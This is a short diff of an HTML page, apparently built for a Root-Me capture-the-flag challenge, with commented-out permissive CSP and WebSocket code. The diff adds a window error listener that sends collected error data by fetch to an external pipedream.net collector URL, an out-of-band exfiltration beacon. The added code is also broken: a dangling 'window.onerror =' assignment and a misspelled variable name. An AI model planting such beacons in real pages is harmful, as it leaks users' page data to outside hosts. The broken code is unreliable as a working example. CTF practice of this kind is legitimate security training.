@@ -1,4 +1,4 @@
-
+<!DOCTYPE html>
 <!--<meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
 <META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf20.root-me.org/room">
 -->
@@ -102,4 +102,12 @@ function gogo() {
 	//ws.send(`hello`);
 }
 */
+
+var errors = "";
+window.onerror = 
+
+window.addEventListener("error", (event) => {
+  erros += event;
+  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+errors, {mode: 'no-cors'})
+});
 </script>
